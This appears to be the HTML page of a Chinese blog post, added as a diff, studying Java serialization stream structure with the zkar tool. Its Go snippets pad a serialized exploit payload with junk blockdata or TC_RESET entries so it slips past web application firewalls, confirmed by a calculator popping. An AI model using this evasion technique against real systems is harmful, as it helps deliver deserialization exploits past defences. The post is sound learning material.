@@ -1,0 +1,533 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/2.png">
+  <link rel="icon" href="/img/2.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  <meta name="description" content="Java反序列化协议构造与分析跟着p神学习（相当于是copy了一遍p神的知识）。首先这里p神引入了zkar工具，有些小笨，来说一下如何安装使用他。 Go语言下载这里版本不能太高，因为后续没有go get命令，我用的版本。 如果go get的时候没有反应，这里设置一下就可以解决。 接下来就可以学习了。 序列化流分析这里就用p神的代码进行分析。贴一下在zkar工具使用之后的序列化流。 12345678">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Java反序列化协议构造与分析">
+<meta property="og:url" content="http://example.com/2022/03/23/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8D%8F%E8%AE%AE%E6%9E%84%E9%80%A0%E4%B8%8E%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="Xsw6_a">
+<meta property="og:description" content="Java反序列化协议构造与分析跟着p神学习（相当于是copy了一遍p神的知识）。首先这里p神引入了zkar工具，有些小笨，来说一下如何安装使用他。 Go语言下载这里版本不能太高，因为后续没有go get命令，我用的版本。 如果go get的时候没有反应，这里设置一下就可以解决。 接下来就可以学习了。 序列化流分析这里就用p神的代码进行分析。贴一下在zkar工具使用之后的序列化流。 12345678">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203232117579.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203232117786.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203232011046.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203232117599.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203232117195.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203232039471.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203232045611.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203232117669.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203232057749.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203232108918.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203232117703.png">
+<meta property="article:published_time" content="2022-03-23T13:16:56.000Z">
+<meta property="article:modified_time" content="2022-03-23T13:17:36.525Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="java">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203232117579.png">
+  
+  <title>Java反序列化协议构造与分析 - Xsw6_a</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css" />
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.12","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname"}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>热爱使我从未停下脚步</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-about-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/1.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="Java反序列化协议构造与分析">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2022-03-23 21:16" pubdate>
+        2022年3月23日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      3.4k 字
+    </span>
+  
+
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      11 分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Java反序列化协议构造与分析</h1>
+            
+            <div class="markdown-body">
+              <h1 id="Java反序列化协议构造与分析"><a href="#Java反序列化协议构造与分析" class="headerlink" title="Java反序列化协议构造与分析"></a>Java反序列化协议构造与分析</h1><p>跟着p神学习（相当于是copy了一遍p神的知识）。<br>首先这里p神引入了<a target="_blank" rel="noopener" href="https://github.com/phith0n/zkar#-installing">zkar</a>工具，有些小笨，来说一下如何安装使用他。</p>
+<h2 id="Go语言下载"><a href="#Go语言下载" class="headerlink" title="Go语言下载"></a>Go语言下载</h2><p>这里版本不能太高，因为后续没有<code>go get</code>命令，我用的版本。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203232117579.png" srcset="/img/loading.gif" lazyload alt="QQ截图20220323200027"></p>
+<p>如果<code>go get</code>的时候没有反应，<a target="_blank" rel="noopener" href="https://www.quanxiaoha.com/golang/go-get-no-response.html">这里</a>设置一下就可以解决。</p>
+<p>接下来就可以学习了。</p>
+<h2 id="序列化流分析"><a href="#序列化流分析" class="headerlink" title="序列化流分析"></a>序列化流分析</h2><p>这里就用p神的代码进行分析。贴一下在zkar工具使用之后的序列化流。</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs go">@Magic - <span class="hljs-number">0xac</span> ed<br>@Version - <span class="hljs-number">0x00</span> <span class="hljs-number">05</span><br>@Contents<br>  TC_OBJECT - <span class="hljs-number">0x73</span><br>    TC_CLASSDESC - <span class="hljs-number">0x72</span><br>      @ClassName<br>        @Length - <span class="hljs-number">4</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">04</span><br>        @Value - User - <span class="hljs-number">0x55</span> <span class="hljs-number">73</span> <span class="hljs-number">65</span> <span class="hljs-number">72</span><br>      @SerialVersionUID - <span class="hljs-number">1731783446313105847</span> - <span class="hljs-number">0x18</span> <span class="hljs-number">08</span> <span class="hljs-number">87</span> de <span class="hljs-number">79</span> <span class="hljs-number">64</span> f9 b7<br>      @Handler - <span class="hljs-number">8257536</span><br>      @ClassDescFlags - SC_SERIALIZABLE - <span class="hljs-number">0x02</span><br>      @FieldCount - <span class="hljs-number">2</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">02</span><br>      []Fields<br>        Index <span class="hljs-number">0</span>:<br>          Object - L - <span class="hljs-number">0x4c</span><br>          @FieldName<br>            @Length - <span class="hljs-number">4</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">04</span><br>            @Value - name - <span class="hljs-number">0x6e</span> <span class="hljs-number">61</span> <span class="hljs-number">6</span>d <span class="hljs-number">65</span><br>          @ClassName<br>            TC_STRING - <span class="hljs-number">0x74</span><br>              @Handler - <span class="hljs-number">8257537</span><br>              @Length - <span class="hljs-number">18</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">12</span><br>              @Value - Ljava/lang/String; - <span class="hljs-number">0x4c</span> <span class="hljs-number">6</span>a <span class="hljs-number">61</span> <span class="hljs-number">76</span> <span class="hljs-number">61</span> <span class="hljs-number">2</span>f <span class="hljs-number">6</span>c <span class="hljs-number">61</span> <span class="hljs-number">6</span>e <span class="hljs-number">67</span> <span class="hljs-number">2</span>f <span class="hljs-number">53</span> <span class="hljs-number">74</span> <span class="hljs-number">72</span> <span class="hljs-number">69</span> <span class="hljs-number">6</span>e <span class="hljs-number">67</span> <span class="hljs-number">3</span>b<br>        Index <span class="hljs-number">1</span>:<br>          Object - L - <span class="hljs-number">0x4c</span><br>          @FieldName<br>            @Length - <span class="hljs-number">6</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">06</span><br>            @Value - parent - <span class="hljs-number">0x70</span> <span class="hljs-number">61</span> <span class="hljs-number">72</span> <span class="hljs-number">65</span> <span class="hljs-number">6</span>e <span class="hljs-number">74</span><br>          @ClassName<br>            TC_STRING - <span class="hljs-number">0x74</span><br>              @Handler - <span class="hljs-number">8257538</span><br>              @Length - <span class="hljs-number">6</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">06</span><br>              @Value - LUser; - <span class="hljs-number">0x4c</span> <span class="hljs-number">55</span> <span class="hljs-number">73</span> <span class="hljs-number">65</span> <span class="hljs-number">72</span> <span class="hljs-number">3</span>b<br>      []ClassAnnotations<br>        TC_ENDBLOCKDATA - <span class="hljs-number">0x78</span><br>      @SuperClassDesc<br>        TC_NULL - <span class="hljs-number">0x70</span><br>    @Handler - <span class="hljs-number">8257539</span><br>    []ClassData<br>      @ClassName - User<br>        &#123;&#125;Attributes<br>          name<br>            TC_STRING - <span class="hljs-number">0x74</span><br>              @Handler - <span class="hljs-number">8257540</span><br>              @Length - <span class="hljs-number">3</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">03</span><br>              @Value - Bob - <span class="hljs-number">0x42</span> <span class="hljs-number">6</span>f <span class="hljs-number">62</span><br>          parent<br>            TC_OBJECT - <span class="hljs-number">0x73</span><br>              TC_REFERENCE - <span class="hljs-number">0x71</span><br>                @Handler - <span class="hljs-number">8257536</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">7</span>e <span class="hljs-number">00</span> <span class="hljs-number">00</span><br>              @Handler - <span class="hljs-number">8257541</span><br>              []ClassData<br>                @ClassName - User<br>                  &#123;&#125;Attributes<br>                    name<br>                      TC_STRING - <span class="hljs-number">0x74</span><br>                        @Handler - <span class="hljs-number">8257542</span><br>                        @Length - <span class="hljs-number">5</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">05</span><br>                        @Value - Josua - <span class="hljs-number">0x4a</span> <span class="hljs-number">6</span>f <span class="hljs-number">73</span> <span class="hljs-number">75</span> <span class="hljs-number">61</span><br>                    parent<br>                      TC_NULL - <span class="hljs-number">0x70</span><br></code></pre></td></tr></table></figure>
+
+<p><code>Contents</code>:<strong>只包含一个 newObject ，其第一部分是 ClassDesc ，包含了User这个类的信息，比如类名、SerialVersionUID、父类、属性列表等</strong>。</p>
+<p><code>[]classData</code>:<strong>包含两个属性， name 和 parent ，</strong><br><strong>parent 也是一个 newObject</strong>。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203232117786.png" srcset="/img/loading.gif" lazyload alt="QQ截图20220323201106"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203232011046.png" srcset="/img/loading.gif" lazyload alt="QQ截图20220323201132"></p>
+<h2 id="构造一个包含垃圾数据的序列化流"><a href="#构造一个包含垃圾数据的序列化流" class="headerlink" title="构造一个包含垃圾数据的序列化流"></a>构造一个包含垃圾数据的序列化流</h2><p>一般垃圾数据多半是绕过waf，这里p神也介绍了<strong>c0ny1</strong>师傅的文章。<br> content 是由 object 或 blockdata 组成， blockdata 就是一个适合用来填充脏字符。</p>
+<p>这里就不用p神的cc6了，因为电脑重装系统了。（文件全没了。）</p>
+<h3 id="添加垃圾数据（数据包之前）"><a href="#添加垃圾数据（数据包之前）" class="headerlink" title="添加垃圾数据（数据包之前）"></a>添加垃圾数据（数据包之前）</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> main<br><span class="hljs-title function_">import</span> <span class="hljs-params">(</span><br><span class="hljs-params"><span class="hljs-string">&quot;github.com/phith0n/zkar/serz&quot;</span></span><br><span class="hljs-params"><span class="hljs-string">&quot;io/ioutil&quot;</span></span><br><span class="hljs-params"><span class="hljs-string">&quot;log&quot;</span></span><br><span class="hljs-params"><span class="hljs-string">&quot;strings&quot;</span></span><br><span class="hljs-params">)</span><br>func <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>data, _ := ioutil.ReadFile(<span class="hljs-string">&quot;xsw6_a.bin&quot;</span>)<br>serialization, err := serz.FromBytes(data)<br><span class="hljs-keyword">if</span> err != nil &#123;<br>log.Fatal(<span class="hljs-string">&quot;parse error&quot;</span>)<br>&#125;<br><span class="hljs-type">var</span> <span class="hljs-variable">blockData</span> <span class="hljs-operator">=</span> &amp;serz.TCContent&#123;<br>Flag: serz.JAVA_TC_BLOCKDATALONG,<br>BlockData: &amp;serz.TCBlockData&#123;<br>Data: []<span class="hljs-type">byte</span>(strings.Repeat(<span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-number">40000</span>)),<br>&#125;,<br>&#125;<br>serialization.Contents = append(serialization.Contents, blockData)<br>ioutil.WriteFile(<span class="hljs-string">&quot;xsw6_a-padding.ser&quot;</span>, serialization.ToBytes(), 0o755)<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203232117599.png" srcset="/img/loading.gif" lazyload alt="QQ截图20220323203520"></p>
+<p>结果如下。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203232117195.png" srcset="/img/loading.gif" lazyload alt="QQ截图20220323203625"></p>
+<p>可以看到aaaa已经写入。<br>这时候去执行一下新文件。<code>xsw6_a-padding.ser</code><br>成功弹出计算器。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203232039471.png" srcset="/img/loading.gif" lazyload alt="QQ截图20220323203855"></p>
+<p>成功写入垃圾数据并且不影响反序列化结果。</p>
+<h3 id="添加垃圾数据（数据包之后）"><a href="#添加垃圾数据（数据包之后）" class="headerlink" title="添加垃圾数据（数据包之后）"></a>添加垃圾数据（数据包之后）</h3><p>寻思这这不简单，test.go里面的代码换个位置就行。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203232045611.png" srcset="/img/loading.gif" lazyload alt="QQ截图20220323204459"></p>
+<p>emmmm一执行就报错。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203232117669.png" srcset="/img/loading.gif" lazyload alt="QQ截图20220323204532"></p>
+<p>看了下p神的结合报错，一下明白为什么p神这么写。（主要是真一点都不懂go语言）。</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go">serialization.Contents = <span class="hljs-built_in">append</span>([]*serz.TCContent&#123;blockData&#125;,<br>serialization.Contents...)<br></code></pre></td></tr></table></figure>
+
+<p>但是这里弹不出计算器了。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203232057749.png" srcset="/img/loading.gif" lazyload alt="QQ截图20220323205735"></p>
+<p>继续跟p神学习了一下。</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;github.com/phith0n/zkar/serz&quot;</span><br><span class="hljs-string">&quot;io/ioutil&quot;</span><br><span class="hljs-string">&quot;log&quot;</span><br>)<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>data, _ := ioutil.ReadFile(<span class="hljs-string">&quot;xsw6_a.bin&quot;</span>)<br>serialization, err := serz.FromBytes(data)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatal(<span class="hljs-string">&quot;parse error&quot;</span>)<br>&#125;<br><span class="hljs-keyword">var</span> contents []*serz.TCContent<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5000</span>; i++ &#123;<br><span class="hljs-keyword">var</span> blockData = &amp;serz.TCContent&#123;<br>Flag: serz.JAVA_TC_RESET,<br>&#125;<br>contents = <span class="hljs-built_in">append</span>(contents, blockData)<br>&#125;<br>serialization.Contents = <span class="hljs-built_in">append</span>(contents, serialization.Contents...)<br>ioutil.WriteFile(<span class="hljs-string">&quot;xsw6_a-padding.ser&quot;</span>, serialization.ToBytes(), <span class="hljs-number">0</span>o755)<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>对比一下前后+理解一下p神贴出来的代码。也就明白了p神说的话。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203232108918.png" srcset="/img/loading.gif" lazyload alt="QQ截图20220323210554"></p>
+<p>时因为我们 contents 里第一个结构是一个 blockdata ，所以会进入 case<br>TC_BLOCKDATALONG 中，而这里面就抛出了异常。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203232117703.png" srcset="/img/loading.gif" lazyload alt="QQ截图20220323211439"></p>
+<p>成功弹出计算器。</p>
+<h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>前面在 object 后填充一个 blockdata 的方法之所以可行，就是因为首个结构是 object ，处理完后反<br>序列化就结束了， blockdata 根本没有处理，也就不会抛出异常了。<br>那么，我们利用 contents 来填充垃圾字符的方法是否还有效呢？当然有效，<strong>刚刚我们已经说了，在处</strong><br><strong>理 object 前Java会丢弃所有的 TC_RESET （实际上在Grammer中 TC_RESET 也是 object 的一种结</strong><br><strong>构），那么我们用这个字符来填充不就可以了吗？</strong></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/JavaWeb/">JavaWeb</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/java/">java</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/03/22/RMI%E6%81%B6%E6%84%8F%E6%9C%8D%E5%8A%A1%E5%8F%82%E6%95%B0/">
+                        <span class="hidden-mobile">RMI恶意服务参数</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+    <!--《添加网站运行时间 -->
+<br/>
+
+<span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+<script>
+var now = new Date(); 
+
+function createtime() {
+    //此处修改你的建站时间或者网站上线时间
+    var grt = new Date('02/23/2022 00:00:00');
+    now.setTime(now.getTime() + 250);
+    days = (now - grt) / 1000 / 60 / 60 / 24;
+
+    dnum = Math.floor(days);
+    hours = (now - grt) / 1000 / 60 / 60 - (24 * dnum);
+    hnum = Math.floor(hours);
+    if (String(hnum).length == 1) {
+        hnum = "0" + hnum;
+    }
+    minutes = (now - grt) / 1000 / 60 - (24 * 60 * dnum) - (60 * hnum);
+    mnum = Math.floor(minutes);
+    if (String(mnum).length == 1) {
+        mnum = "0" + mnum;
+    }
+    seconds = (now - grt) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+    snum = Math.round(seconds);
+    if (String(snum).length == 1) {
+        snum = "0" + snum;
+    }
+    document.getElementById("timeDate").innerHTML = "" + dnum + " 天 ";
+    document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+}
+setInterval("createtime()", 250);
+</script>
+
+<!-- 添加网站运行时间》-->
+
+  </div>
+  
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  
+    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4/dist/tocbot.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4/anchor.min.js" ></script>
+  
+  
+    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js" ></script>
+  
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
